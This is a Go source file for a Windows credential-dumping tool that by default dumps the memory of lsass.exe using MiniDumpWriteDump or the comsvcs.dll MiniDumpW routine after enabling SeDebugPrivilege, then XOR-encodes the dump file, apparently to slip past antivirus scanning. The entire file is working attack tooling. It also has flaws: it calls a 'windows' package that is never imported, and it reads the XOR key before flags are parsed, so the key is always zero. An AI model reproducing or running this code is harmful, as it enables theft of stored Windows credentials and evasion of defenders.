package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"os"
	"syscall"
	"unsafe"
)

const (
	TH32CS_SNAPPROCESS = 0x00000002
	PROCESS_ALL_ACCESS = 0x1F0FFF
)

var (
	infile  string
	outfile string
	process string
	method  string
	pid     int
	xorInt  int
	xorByte byte
)

func init() {
	flag.StringVar(&infile, "in", "", "Input file to Xor")
	flag.StringVar(&outfile, "out", "minidump.dmp", "minidump outfile")
	flag.StringVar(&process, "process", "lsass.exe", "Process to dump")
	flag.StringVar(&method, "m", "dbghelp", "[ dbghelp | dbgcore | comsvcs ]")
	flag.IntVar(&pid, "pid", 0, "PID of process. Takes precedence over --process")
	flag.IntVar(&xorInt, "x", 0x00, "Single Byte Xor Key")
	xorByte = byte(xorInt)
	flag.Parse()
}

func main() {
	var (
		dumpdata []byte
		err      error
	)

	if infile != "" {
		xorFileData, err := os.ReadFile(infile)
		if err != nil {
			fmt.Println(err)
			os.Exit(1)
		}
		err = writeXorContent(xorFileData, xorByte, outfile)
		if err != nil {
			fmt.Println(err)
			os.Exit(1)
		}
		fmt.Printf("File %s xor'd with %d and written to %s\n", infile, xorByte, outfile)
		os.Exit(0)
	}

	if pid != 0 {
		dumpdata, err = miniDump(outfile, "", uint32(pid))
	} else {
		dumpdata, err = miniDump(outfile, process, 0)
	}
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	err = writeXorContent(dumpdata, xorByte, outfile)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	fmt.Printf("File written to %s\nXor byte: %d", outfile, xorByte)
}

func writeXorContent(data []byte, key byte, file string) (err error) {
	xordDump := make([]byte, len(data))
	for i, b := range data {
		xordDump[i] = b ^ key
	}
	err = ioutil.WriteFile(file, xordDump, 0644)
	return
}

func miniDump(outfile, process string, inPid uint32) (mini []byte, err error) {
	procID, err := getProcess(process, inPid)
	if err != nil {
		return
	}

	err = sePrivEnable("SeDebugPrivilege")
	if err != nil {
		return
	}

	switch method {
	case "comsvcs":
		mini, err = comsvcsDumper(procID)
	default:
		mini, err = dbgDumper(procID, method)
	}
	return
}

func dbgDumper(pid uint32, dll string) (mini []byte, err error) {
	hProc, err := syscall.OpenProcess(PROCESS_ALL_ACCESS, false, pid)
	if err != nil {
		return
	}

	f, tempErr := os.CreateTemp("", "*.tmp")
	if tempErr != nil {
		return
	}
	defer os.Remove(f.Name())

	miniDump := windows.NewLazySystemDLL(dll).NewProc("MiniDumpWriteDump")
	r, _, _ := miniDump.Call(
		uintptr(hProc),       //hProcess,
		uintptr(uint32(pid)), //ProcessId
		f.Fd(),               //fFile
		3,                    //DumpType
		0,                    //ExceptionParam
		0,                    //UserStreamParam
		0,                    //CallbackParam
	)
	f.Close() //idk why this fixes the 'not same as on disk' issue, but it does
	if r != 0 {
		mini, err = os.ReadFile(f.Name())
		if err != nil {
			f.Close()
			return
		}
	}
	return
}

func comsvcsDumper(pid uint32) (mini []byte, err error) {
	tmpFile := "temp"
	comsvcs := windows.NewLazySystemDLL("comsvcs.dll")
	miniDump := comsvcs.NewProc("MiniDumpW")

	args := fmt.Sprintf("%d %s full", pid, tmpFile)
	argsPtr := uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(args)))
	defer os.Remove(tmpFile)
	r, _, _ := miniDump.Call(uintptr(0), uintptr(0), argsPtr)

	if r != 0 {
		mini, err = os.ReadFile(tmpFile)
	}
	return
}

func getProcess(name string, pid uint32) (uint32, error) {
	//https://github.com/mitchellh/go-ps/blob/master/process_windows.go

	if pid <= 0 && name == "" {
		return 0, fmt.Errorf("a process name OR process ID must be provided")
	}

	snapshotHandle, err := syscall.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
	if snapshotHandle < 0 || err != nil {
		return 0, fmt.Errorf("there was an error creating the snapshot:\r\n%s", err)
	}
	defer syscall.CloseHandle(snapshotHandle)

	var process syscall.ProcessEntry32
	process.Size = uint32(unsafe.Sizeof(process))
	err = syscall.Process32First(snapshotHandle, &process)
	if err != nil {
		return 0, fmt.Errorf("there was an accessing the first process in the snapshot:\r\n%s", err)
	}

	for {
		processName := ""
		// Iterate over characters to build a full string
		for _, chr := range process.ExeFile {
			if chr != 0 {
				processName = processName + string(int(chr))
			}
		}
		if pid > 0 {
			if process.ProcessID == pid {
				return pid, nil
			}
		} else if name != "" {
			if processName == name {
				return process.ProcessID, nil
			}
		}
		err = syscall.Process32Next(snapshotHandle, &process)
		if err != nil {
			break
		}
	}
	return 0, fmt.Errorf("could not find a procces with the supplied name \"%s\" or PID of \"%d\"", name, pid)
}
